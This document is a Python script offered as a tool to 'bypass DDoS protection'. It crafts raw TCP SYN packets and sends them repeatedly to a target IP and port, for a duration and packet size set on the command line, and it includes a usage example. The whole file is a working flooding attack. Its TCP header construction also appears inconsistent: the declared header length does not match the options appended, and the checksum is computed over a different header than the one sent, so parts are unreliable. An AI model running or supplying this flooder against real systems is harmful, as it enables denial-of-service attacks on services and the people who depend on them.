import random
import socket
import struct
import netifaces
import argparse
import time


# Created by: CodesParadox
# Created on: 03-04-2023
# Version: 7.0
# Language: Python
# Description: Another Method to Bypass DDoS Protection


#To Use This Script:
# python Converstion_v7.0.py -t 192.168.1.1 -p 80 -d 60 -s 1024



# Create a raw socket and bind it to the public interface (eth0) on Linux or the public interface (en0) on Mac OS X
def send_packet(src_ip, src_port, dst_ip, dst_port, payload):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except socket.error:
        return
    ip_header = create_ip_header(src_ip, dst_ip, len(payload))
    tcp_header = create_tcp_header(src_port, dst_port, payload, src_ip, dst_ip)
    packet = ip_header + tcp_header + payload
    s.sendto(packet, (dst_ip, 0))
    s.close()

def create_ip_header(src_ip, dst_ip, payload_len):
    version = 4
    ihl = 5
    tos = 0
    total_length = 20 + 20 + payload_len
    id = random.randint(0, 65535)
    flags = 0
    fragment_offset = 0
    ttl = 255
    protocol = socket.IPPROTO_TCP
    checksum = 0
    src_ip = socket.inet_aton(src_ip)
    dst_ip = socket.inet_aton(dst_ip)
    ip_header = struct.pack("!BBHHHBBH4s4s", (version << 4) + ihl, tos, total_length, id, (flags << 13) + fragment_offset, ttl, protocol, checksum, src_ip, dst_ip)
    return ip_header

def create_tcp_header(src_port, dst_port, payload, src_ip, dst_ip):
    seq = 0
    ack_seq = 0
    doff = 5
    flags = 2 # SYN
    window = socket.htons(5840)
    checksum = 0
    urgent_pointer = 0
    options = b'\x02\x04\x05\xb4\x04\x02\x08\x0a\x00\x7a\x0f\x41\x46\x46\x00\x00\x00\x00\x01\x03\x03\x07'
    pseudo_header = struct.pack('!4s4sBBH', socket.inet_aton(src_ip), socket.inet_aton(dst_ip), 0, socket.IPPROTO_TCP, len(payload) + 20)
    tcp_header = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq, (doff << 4) + flags, window, checksum, urgent_pointer, 0) + options
    tcp_checksum = checksum_tcp_header(pseudo_header + tcp_header + payload)
    tcp_header = struct.pack('!HHLLBBH', src_port, dst_port, seq, ack_seq, (doff << 4) + flags, window, tcp_checksum, urgent_pointer) + options
    return tcp_header

def checksum_tcp_header(data):
    if len(data) % 2 != 0:
        data += b'\x00'
    words = [int.from_bytes(data[i:i+2], byteorder='big') for i in range(0, len(data), 2)]
    chksum = sum(words)
    while chksum >> 16:
        chksum = (chksum >> 16) + (chksum & 0xffff)
    chksum = ~chksum & 0xffff
    return chksum

def ddos_bypass(target_ip, target_port, duration, packet_size):
    start_time = time.time()
    while True:
        elapsed_time = time.time() - start_time
        if elapsed_time > duration:
            break
        src_ip = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']
        src_port = random.randint(1024, 65535)
        payload = b'\x00' * packet_size
        send_packet(src_ip, src_port, target_ip, target_port, payload)

def main():
    parser = argparse.ArgumentParser(description='DDoS Bypass')
    parser.add_argument('-t', '--target', help='Target IP', required=True)
    parser.add_argument('-p', '--port', help='Target Port', required=True)
    parser.add_argument('-d', '--duration', help='Duration (seconds)', required=True)
    parser.add_argument('-s', '--size', help='Packet Size (bytes)', required=True)
    args = parser.parse_args()
    target_ip = args.target
    target_port = int(args.port)
    duration = int(args.duration)
    packet_size = int(args.size)
    ddos_bypass(target_ip, target_port, duration, packet_size)

if __name__ == '__main__':
    main()

